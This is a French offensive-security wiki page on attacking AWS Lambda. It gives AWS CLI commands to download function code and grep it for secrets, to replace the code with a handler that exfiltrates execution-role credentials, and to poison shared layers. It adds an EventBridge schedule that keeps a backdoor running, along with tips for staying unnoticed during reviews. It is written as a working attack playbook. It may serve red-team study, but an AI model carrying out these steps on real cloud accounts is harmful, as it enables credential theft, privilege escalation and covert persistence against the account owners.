---
title: "Code et couches : exécuter du code attaquant sous le rôle d'exécution"
order: 2
description: "Lire le code source et les couches d'une fonction à la recherche de secrets, et écraser le code ou les couches pour exécuter du code sous le rôle d'exécution."
keywords:
  - Lambda
  - couches
  - code source
  - secrets
  - écrasement
---

# Code et couches

`lambda:GetFunction` renvoie une URL présignée vers le paquet de déploiement de la fonction, ce qui permet de télécharger et de lire son code source à la recherche de secrets codés en dur. Avec `lambda:UpdateFunctionCode` ou `lambda:UpdateFunctionConfiguration`, le paquet ou ses **couches (layers)** peuvent être remplacés, et la prochaine invocation exécute du code attaquant sous le [rôle d'exécution](execution-role.md) de la fonction. Une couche partagée est une cible particulièrement discrète : empoisonner une version de couche atteint toutes les fonctions qui l'utilisent.

## Lire le code déployé

```bash
aws lambda get-function --function-name <fn> --query 'Code.Location'   # presigned zip URL
curl -s "<presigned-url>" -o fn.zip && unzip -o fn.zip -d fn/
grep -rinE 'secret|password|token|AKIA' fn/
```

## Écraser le code pour exécuter du code sous le rôle

```bash
# package a handler that exfiltrates the execution-role credentials, then
aws lambda update-function-code --function-name <fn> --zip-file fileb://evil.zip
aws lambda invoke --function-name <fn> /dev/stdout   # or wait for a natural trigger
```

## Empoisonner une couche

```bash
aws lambda publish-layer-version --layer-name x --zip-file fileb://layer.zip
aws lambda update-function-configuration --function-name <fn> \
  --layers arn:aws:lambda:<region>:<acct>:layer:x:1
```

## Persistance pilotée par événement

Une fonction backdoorée ne devient rentable que lorsqu'elle s'exécute : il faut donc associer le remplacement de code ou de couche à un déclencheur qui la réinvoque même lorsque personne n'appelle l'API qu'elle expose, un interrupteur de type « dead man's switch » qui rétablit l'accès en continu.

```bash
# scheduled re-invoke via EventBridge
aws events put-rule --name keepalive --schedule-expression 'rate(1 hour)'
aws lambda add-permission --function-name <fn> --statement-id eb \
  --action lambda:InvokeFunction --principal events.amazonaws.com \
  --source-arn <rule-arn>
aws events put-targets --rule keepalive --targets "Id=1,Arn=<fn-arn>"
```

La variante la plus discrète réagit à un événement d'API précis plutôt qu'à une horloge ; voir [EventBridge](eventbridge.md) pour la règle qui réinvoque une backdoor chaque fois qu'un appel choisi survient.

## Notes d'exploitation

- Écraser le code constitue à la fois un chemin d'élévation de privilèges (s'exécuter en tant que rôle d'exécution) et une persistance durable (la fonction reste modifiée jusqu'à son redéploiement).
- Préférez attendre un déclenchement naturel plutôt qu'un `invoke` lorsque la discrétion compte, afin que l'exécution paraisse routinière.
- Les couches s'appliquent au niveau de la configuration, si bien qu'un remplacement de couche laisse le code de la fonction intact et passe facilement inaperçu lors d'une revue.

## Outils

- **AWS CLI** (`lambda get-function`, `update-function-code`, `publish-layer-version`) : lecture et remplacement.
- **Pacu** (`lambda__enum`) : localiser les fonctions et leurs couches.
- **Pacu** (`lambda__backdoor_new_roles`, `lambda__backdoor_new_users`, `lambda__backdoor_new_sec_groups`) : implanter des backdoors adossées à Lambda qui se déclenchent sur des événements CloudWatch.

## Références

- [HackTricks Cloud : persistance AWS Lambda](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [AWS : couches Lambda](https://docs.aws.amazon.com/lambda/latest/dg/chapter-layers.html)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
- [Rhino Security Labs : élévation de privilèges AWS](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [Stratus Red Team : techniques AWS](https://stratus-red-team.cloud/attack-techniques/AWS/)
